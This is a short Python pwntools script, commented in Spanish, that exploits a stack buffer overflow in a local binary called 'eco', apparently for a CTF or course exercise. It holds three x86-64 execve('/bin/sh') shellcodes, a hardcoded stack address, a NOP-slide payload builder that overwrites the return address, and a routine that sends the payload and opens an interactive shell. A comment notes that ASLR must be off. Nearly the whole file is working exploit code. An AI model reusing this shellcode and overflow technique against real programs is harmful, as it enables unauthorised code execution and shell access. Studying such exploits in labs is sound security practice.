#!/usr/bin/python3

# No olvidar quitar ASLR

from pwn import *

# Cargamos el binario
# eco = gdb.debug("./eco")
eco = process("./eco")

# Hay que encontrar cual funciona
stackp = 0x00007fffffffdbe0
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode = b"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"


def payload(shellcode, stackp, offset = 216):
    # El shellcode tiene que estar alineado con el stack tras el NOP slide.
    slide = 16 * 10 * b'\x90'
    rest = (offset - len(slide) - len(shellcode)) * 'A'
    # [ 0x90 0x90 ...... 0x90 <shellcode> <basura> <rip> ]
    return flat(slide, shellcode, rest, stackp, endianness="little", word_size=64)


# Explotamos para sacar la shell
def exploit(payload):
    eco.sendline(payload)
    eco.interactive()

# Por si queremos analizar el payload
def to_file(payload):
    with open("payload.out", "wb") as pay:
        pay.write(payload)

res = payload(shellcode, stackp)
exploit(res)
# to_file(res)
